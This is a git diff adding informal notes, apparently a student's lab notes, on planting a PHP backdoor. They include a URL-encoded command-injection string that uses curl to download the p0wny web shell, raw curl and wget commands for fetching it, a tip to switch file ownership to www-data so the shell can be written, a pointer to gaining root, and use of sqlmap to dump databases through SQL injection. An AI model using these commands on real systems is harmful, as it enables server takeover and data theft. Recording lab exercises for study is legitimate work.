@@ -1,0 +1,43 @@
+BackDOOR setup:
+
+already tested in my lab using sibis sql injection video.
+
+use any backdoor php shell and explore more about what are the shells available
+
+&&%20curl%20-o%20powny.php%20https://github.com/backdoorhub/shell-backdoor-list/blob/master/shell/php/p0wny-shell.php this is currently used shell.
+called powny
+
+learn about how to gain userroot access after setup the backdoor
+
+in lab it will deny to create a backdoor file because of the permission is in the user(our) change that into www-data it will work
+
+link of powny(✅ Raw Link (for curl or wget):
+bash
+Copy
+Edit
+https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
+✅ Usage with curl:
+bash
+Copy
+Edit
+curl https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php -o shell.php
+✅ Usage with wget:
+bash
+Copy
+Edit
+wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
+)
+
+sql injection 
+
+uses the sqlmap more 
+
+--wizard is easy
+
+give the website link and find where is vulnerability ex jason {"username":"","password":""} like this sqlmap will give the entire deatils about the database
+
+sqlmap already in the lab
+
+
+
+I AM COMMITING THIS IN THE GIT IN PHP PHOTOGRAM PROJECT NAME CALLED INJECTIONS: IF YOU WANT CHECK OUT THE CODES AND THIS FILL WILL BE THERE AFTER THAT I WILL REMOVE THIS OK
